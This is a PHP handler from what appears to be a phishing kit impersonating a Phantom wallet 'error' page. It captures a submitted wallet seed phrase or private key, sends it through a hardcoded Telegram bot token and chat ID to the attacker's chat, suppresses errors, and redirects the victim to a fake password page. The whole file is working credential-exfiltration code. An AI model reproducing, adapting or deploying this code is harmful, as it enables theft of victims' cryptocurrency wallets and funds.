<?php
error_reporting(0);
session_start();

if(isset($_POST['pkey'])){
$_SESSION['pkey'] = $_POST['pkey'];


  $hexor = '
------------- 🔥🔥 phantom error 2 Wallet 🔥🔥-----------------------
phrase: '.$_SESSION["pkey"].' 
-------------------------------------------------
';

}

$botToken="7806127700:AAFINjlxlJxKu6xgq3ycet49QFL-6qo_N2c";
$chatId="-4888634633";  

  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$hexor,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  header("Location: ../Password.html");
?>